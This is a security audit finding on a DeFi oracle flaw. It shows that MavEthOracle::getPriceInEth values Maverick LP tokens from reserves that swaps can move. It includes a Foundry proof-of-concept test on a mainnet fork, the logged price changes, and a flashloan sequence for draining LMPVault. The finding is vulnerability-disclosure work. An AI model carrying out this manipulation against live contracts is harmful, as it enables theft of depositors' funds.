# `MavEthOracle::getPriceInEth` can be manipulated by making swaps in the pool, due to incorrect LP token evaluation
## Summary

The `MavEthOracle::getPriceInEth` can be manipulated by making swaps in the pool, due to incorrect LP token evaluation.
An attacker can drain the LMPVault by inflating the price of Maverick LP token.


## Vulnerability Detail

The following gist contains a proof of concept, demonstraing the manipulation of `MavEthOralc::getPriceInEth`.
https://gist.github.com/lemonmon1984/1fa2b65cd5af377a0cedda04eda9c4ab

It is based on the existing test `test/oracles/providers/MavEthOracle.t.sol`.

The price of the lp token is logged three times:
- price1: before swap
- price2: after the swap on the maverick pool from WETH to SWETH (5000 ether)
- price3: after swapping back on the same pool from SWETH to the WETH (the entire balance)

The result of the test function (forked from the mainnet at the block of 17958278):
```solidity
Logs:
	price1: 1470375172788417698
	price2: 1471416798960606757
	price3: 1470711592033749474
```

As it shows the price from the `MavEthOracle::getPriceInEth` changes as the swap occurs. Note the price of the underlying assets (WETH and SWETH) is not changed in the mock. When the price can be manipulated in a transaction like this, an attacker can utilize flashloan to maximize their gain. For example, in the proof of concept, the swap was done with 5000 ether, but it can be done using flashloan, therefore the initial investment is only the gas. The attacker would pay the fee on the swap, therefore, they should gain enough by the price manipulation, however, it seems plausible depending on the volume of the asset in the maverick destination vault.


```solidity
// MavEthOracle
    // Test getPriceInEth
    function test_getPriceInEth_poc() external {
        // setup addresses
        IWETH9 weth = IWETH9(WETH9_ADDRESS);
        IERC20 sweth = IERC20(SWETH_MAINNET);

        // to have weth in this contract
        vm.deal(address(this), 10000 ether);
        weth.deposit{value: 10000 ether}();

        uint256 wethBalanceBefore = weth.balanceOf(address(this));
 
        // A: WETH
        // B: SWETH
        address mavAddr = ETH_SWETH_MAV;
        IPoolPositionDynamicSlim boostedPosition = IPoolPositionDynamicSlim(mavAddr);
        IMavPool pool = IMavPool(boostedPosition.pool());

    
        vm.mockCall(address(rootOracle), 
                    abi.encodeWithSelector(RootPriceOracle.getPriceInEth.selector, address(weth)),
                    abi.encode(1e18));
        vm.mockCall(address(rootOracle), 
                    abi.encodeWithSelector(RootPriceOracle.getPriceInEth.selector, address(sweth)),
                    abi.encode(1023519*1e12));
        //


 
        uint price1 = mavOracle.getPriceInEth(mavAddr);
        emit log_named_uint("price1", price1);

        // swap WETH -> SWETH
        uint256 swapAmount = 5000 ether;
        pool.swap(address(this), swapAmount, true, false, 0, abi.encode(0));

        uint price2 = mavOracle.getPriceInEth(mavAddr);
        emit log_named_uint("price2", price2);
				
        // swap back WETH -> SWETH
        pool.swap(address(this), sweth.balanceOf(address(this)), false, false, 0, abi.encode(1));

        uint price3 = mavOracle.getPriceInEth(mavAddr);
        emit log_named_uint("price3", price3);

        //// log
				// Logs:
				// 	price1: 1470375172788417698
				// 	price2: 1471416798960606757
				// 	price3: 1470711592033749474
    }
```

The cause of this vulnerability is that the Maverick's LP token is incorrectly evaluated:

Basically the price is 
`(reserveA * priceA) + (reserveB * priceB) / totalSupply`.
However, the numerator, which represents the total asset in the pool, can be swayed by making swaps in the pool, as shown in the above proof of concept.

For more on the pricing of LP tokens and the related real world hack, see the c.Michel's article:
https://cmichel.io/pricing-lp-tokens/


```solidity
// MavEthOracle::getPriceInEth
 66         // Price pool tokens.
 67         uint256 priceInEthTokenA = rootPriceOracle.getPriceInEth(address(pool.tokenA()));
 68         uint256 priceInEthTokenB = rootPriceOracle.getPriceInEth(address(pool.tokenB()));
 69
 70         // Calculate total value of each token in boosted position.
 71         uint256 totalBoostedPositionValueTokenA = reserveTokenA * priceInEthTokenA;
 72         uint256 totalBoostedPositionValueTokenB = reserveTokenB * priceInEthTokenB;
 73
 74         // Return price of lp token in boosted position.
 75         return (totalBoostedPositionValueTokenA + totalBoostedPositionValueTokenB) / boostedPositionTotalSupply;
 76         // slither-disable-end similar-names
```

## Impact

In the issue 10 - "`LMPVault`'s cached `totalDebt` can be abused to drain `LMPVault`", it is shown that one can profit from the price appreciation of the underlying asset by simple steps of
1. LMPVault::deposit
1. LMPVault::updateDebtReporting
1. LMPVault::withdraw

The price manipulation of MavEthOracle can be abused in the same way in the issue 10. Instead of waiting until the underlying asset's price goes up, the attacker can manipulate the price oracle to make the evaluation of Maverick LP token higher.

- Condition: assume there is a Maverick DestinationVault, which uses the MavEthOracle to evaluate the `debt` in the DV, and some assets are deployed to the DestinationVault via rebalance/flashRebalance.
1. An attacker will flashloan a substantial amount of ETH and they will deposit a part of the flashloan in the LMPVault.
1. The attacker will swap in the maverick pool to inflate the price of the Maverick LP Token.
1. The attacker calls `LMPVault::updateDebtReporting` with the Maverick DestinationVault (and maybe some other favorable ones) to update totalAsset in the LMPVault.
1. The attacker will now withdraw all the LMPVault's share. The LMPVault will now consider that it has more totalAsset than the beginning, therefore the attacker will get more of the baseAsset than what they have deposited.
1. The attacker swaps back and repay the flashloan.


As the result, the LMPVault can be potentially drained, as the attacker can mint/deposit LMPVault's share for a cheaper price and withdraw/redeem for a higher price.

Note that this exploitation can still happen even if the issue 10 is fixed, as the attacker will simply skip the `updateDebtReporting` step.
